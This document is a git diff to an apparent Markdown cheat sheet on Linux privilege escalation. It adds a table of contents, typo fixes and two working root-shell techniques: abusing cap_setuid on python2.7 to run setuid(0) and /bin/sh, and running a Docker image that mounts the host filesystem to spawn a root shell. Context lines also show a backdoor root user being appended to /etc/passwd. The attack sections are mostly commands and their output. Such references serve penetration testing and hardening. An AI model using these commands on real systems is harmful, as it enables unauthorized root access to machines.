@@ -10,6 +10,15 @@
 - [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123)
 - [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
 
+## Summary
+
+* [Checklist](#checklist)
+* [SUID](#suid)
+* [Capabilities](#capabilities)
+* [SUDO](#sudo)
+* [Groups](#groups)
+    * [Docker](#docker)
+
 ## Checklists
 
 * Kernel and distribution release details
@@ -111,7 +120,7 @@ sudo chmod +s /tmp/suid # setuid bit
 ```
 
 
-## Capabilies
+## Capabilities
 
 List capabilities of binaries 
 ```bash
@@ -126,10 +135,27 @@ List capabilities of binaries
 /usr/bin/rcp                  = cap_net_bind_service+ep
 ```
 
-Edit capabilites
+Edit capabilities
 ```powershell
 /sbin/setcap -r /bin/ping      # remove
 setcap cap_net_raw+p /bin/ping # add
+```
+
+Interesting capabilities
+
+```powershell
+cap_dac_read_search # read anything
+cap_setuid+ep # setuid
+```
+
+Example of privilege escalation with `cap_setuid+ep`
+
+```powershell
+$ sudo setcap cap_setuid+ep /usr/bin/python2.7
+
+$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+sh-5.0# id
+uid=0(root) gid=1000(swissky)
 ```
 
 ## SUDO
@@ -178,7 +204,30 @@ $> docker run -it --rm -v $PWD:/mnt bash
 $> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
 ```
 
+Or use the following docker image from [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) to spawn a root shell
+
+```powershell
+$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+latest: Pulling from chrisfosterelli/rootplease
+2de59b831a23: Pull complete 
+354c3661655e: Pull complete 
+91930878a2d7: Pull complete 
+a3ed95caeb02: Pull complete 
+489b110c54dc: Pull complete 
+Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
+Status: Downloaded newer image for chrisfosterelli/rootplease:latest
+
+You should now have a root shell on the host OS
+Press Ctrl-D to exit the docker instance / shell
+
+sh-5.0# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+
 
 ## References
 
 - [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
+- [Privilege escalation via Docker - April 22, 2015 — Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
+- [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
